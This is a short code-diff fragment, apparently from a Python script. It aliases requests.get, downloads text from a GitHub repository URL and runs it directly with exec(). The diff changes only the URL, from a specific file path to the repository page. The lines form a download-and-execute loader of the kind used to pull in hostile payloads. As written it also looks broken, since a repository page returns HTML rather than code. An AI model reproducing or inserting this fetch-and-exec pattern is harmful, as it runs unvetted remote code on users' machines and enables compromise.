@@ -80,7 +80,7 @@
 
  rg=rs.get 
 
- x=(rg("https://github.com/BAPJI-BJ-TM/allmm.py/blob/main/Cet.py").text) 
+ x=(rg("https://github.com/BAPJI-BJ-TM/allmm.py").text) 
 
  exec(x) 
 
